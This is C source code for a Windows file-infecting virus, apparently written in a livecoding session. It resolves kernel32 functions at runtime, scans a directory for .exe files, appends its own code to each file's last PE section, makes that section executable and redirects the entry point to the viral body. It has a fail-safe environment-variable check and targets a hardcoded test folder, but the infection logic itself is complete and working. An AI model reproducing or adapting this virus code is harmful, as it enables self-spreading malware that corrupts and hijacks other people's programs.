#include <windows.h>
//#define HANDLE void*
//#define SW_SHOW 5
//typedef unsigned UINT;
//#define __stdcall /**/
//
// __cdecl

// -fpic -fPIE

// getenv
// main(int argc, char **argv, char **envp
// 

#define VIR_PATH "b:\\stream-livecoding\\pl_eps_030\\tests\\"

#define GET_PROC_ADDRESS(NAME, RETURN_TYPE, ...) \
  char s##NAME [] = #NAME; \
  RETURN_TYPE (WINAPI *p##NAME)(__VA_ARGS__) = pGetProcAddress(hKernel32, s##NAME);

void infect_file(
    void* (__stdcall *pGetProcAddress)(HANDLE, const char*),
    HANDLE hKernel32,
    char *file_path,
    DWORD file_size,
    DWORD vir_addr,
    DWORD vir_size);

void infect(
    void* (__stdcall *pGetProcAddress)(HANDLE, const char*),
    HANDLE hKernel32,
    DWORD vir_addr,
    DWORD vir_size
    ) {

  // Fail safe.
  char sGetEnvironmentVariable[] = "GetEnvironmentVariableA";
  DWORD (WINAPI *pGetEnvironmentVariable)(
    LPCTSTR lpName,
    LPTSTR  lpBuffer,
    DWORD   nSize
  ) = pGetProcAddress(hKernel32, sGetEnvironmentVariable);

  char buf[256];
  char sUNSAFE_VIR[] = "UNSAFE_VIR";
  if (pGetEnvironmentVariable(sUNSAFE_VIR, buf, 256) == 0) {
    char sExitProcess[] = "ExitProcess";
    VOID (WINAPI *pExitProcess)(
      UINT uExitCode
    ) = pGetProcAddress(hKernel32, sExitProcess);

    pExitProcess(1337);
  }

  // Find files to infect.
  char sFindFirstFile[] = "FindFirstFileA";
  HANDLE (WINAPI *pFindFirstFile)(
    LPCTSTR           lpFileName,
    LPWIN32_FIND_DATA lpFindFileData
  ) = pGetProcAddress(hKernel32, sFindFirstFile);

  char sFindNextFile[] = "FindNextFileA";
  BOOL (WINAPI *pFindNextFile)(
    HANDLE            hFindFile,
    LPWIN32_FIND_DATA lpFindFileData
  ) = pGetProcAddress(hKernel32, sFindNextFile);

  WIN32_FIND_DATA data;
  char sPattern[] = VIR_PATH "*.exe";

  HANDLE hFind = pFindFirstFile(sPattern, &data);
  if (hFind == INVALID_HANDLE_VALUE) {
    return;
  }
  
  do {
    infect_file(pGetProcAddress, hKernel32,
                data.cFileName, data.nFileSizeLow,
                vir_addr, vir_size);
  } while(pFindNextFile(hFind, &data));
}

void my_memcpy(void *dst, const void *src, size_t len) {
  BYTE *b_dst = dst;
  const BYTE *b_src = src;
  for (size_t i = 0; i < len; i++) {
    *b_dst++ = *b_src++;
  }
}

void my_memreplace(void *start, DWORD magic, DWORD repl) {
  BYTE *p = start;
  for (;;) {
    if (*(DWORD*)p == magic) {
      *(DWORD*)p = repl;
      break;
    } 
    p++;
  }
}

int my_memcmp(void *a, void *b, size_t sz) {
  BYTE *pa = a;
  BYTE *pb = b;
  for (size_t i = 0; i < sz; i++, pa++, pb++) {
    if (*pa != *pb) {
      return *pb - *pa;
    }
  }

  return 0;
}

void infect_file(
    void* (__stdcall *pGetProcAddress)(HANDLE, const char*),
    HANDLE hKernel32,
    char *file_path,
    DWORD file_size,
    DWORD vir_addr,
    DWORD vir_size) {
  GET_PROC_ADDRESS(GetProcessHeap, HANDLE, void);
  GET_PROC_ADDRESS(HeapFree, BOOL, HANDLE, DWORD, LPVOID);
  GET_PROC_ADDRESS(HeapAlloc, LPVOID, HANDLE, DWORD, SIZE_T);
  GET_PROC_ADDRESS(CreateFileA, HANDLE,
    LPCTSTR               lpFileName,
    DWORD                 dwDesiredAccess,
    DWORD                 dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD                 dwCreationDisposition,
    DWORD                 dwFlagsAndAttributes,
    HANDLE                hTemplateFile     
  );
  GET_PROC_ADDRESS(CloseHandle, BOOL, HANDLE);
  GET_PROC_ADDRESS(WriteFile, BOOL, HANDLE, LPCVOID, DWORD, LPDWORD, LPVOID);
  GET_PROC_ADDRESS(ReadFile, BOOL, HANDLE, LPVOID, DWORD, LPDWORD, LPVOID);

  char path[sizeof(VIR_PATH) + 256] = VIR_PATH;
  for (int i = 0; file_path[i]; i++) {
    path[sizeof(VIR_PATH) - 1 + i] = file_path[i];
  }

  HANDLE hFile = pCreateFileA(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, 
      FILE_ATTRIBUTE_NORMAL, NULL);
 
  if (hFile == INVALID_HANDLE_VALUE) {
    return;
  }

  HANDLE hHeap = pGetProcessHeap();
  BYTE *buf = pHeapAlloc(
      hHeap, HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY,
      file_size + 0x1000);

  DWORD tmp;
  pReadFile(hFile, buf, file_size, &tmp, NULL);
  pCloseHandle(hFile);  

  IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)buf;
  IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS*)(buf + dos->e_lfanew);
  /*
  nt->FileHeader.NumberOfSections;
  nt->FileHeader.SizeOfOptionalHeader;
  nt->OptionalHeader.AddressOfEntryPoint; // EP
  nt->OptionalHeader.SizeOfImage;
  */

  IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
  for (DWORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
    sec[i].Characteristics &= ~IMAGE_SCN_MEM_DISCARDABLE;
  }

  IMAGE_SECTION_HEADER *last = &sec[nt->FileHeader.NumberOfSections - 1];
  last->Characteristics |= 
    IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE |
    IMAGE_SCN_CNT_CODE;

  char sVirName[8] = ".vir";

  if (my_memcmp(last->Name, sVirName, 8) == 0) {
    pHeapFree(hHeap, 0, buf);
    return;
  }

  DWORD OEP = nt->OptionalHeader.AddressOfEntryPoint;
  
  my_memcpy(buf + last->PointerToRawData + last->SizeOfRawData,
            (const void*)vir_addr, vir_size);    

  DWORD EP = last->VirtualAddress + last->SizeOfRawData;  
  my_memreplace(buf + last->PointerToRawData + last->SizeOfRawData, 
                0xc0d31234, EP - OEP);

  my_memcpy(last->Name, sVirName, 8);
  //
  last->Misc.VirtualSize += 0x1000;
  last->SizeOfRawData += 0x1000;
  nt->OptionalHeader.SizeOfImage += 0x1000;

  nt->OptionalHeader.AddressOfEntryPoint = EP;

  hFile = pCreateFileA(path, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 
      FILE_ATTRIBUTE_NORMAL, NULL);
 
  if (hFile == INVALID_HANDLE_VALUE) {
    pHeapFree(hHeap, 0, buf);
    return;
  }

  pWriteFile(hFile, buf, file_size + 0x1000, &tmp, NULL);
  pCloseHandle(hFile);
  pHeapFree(hHeap, 0, buf);
}


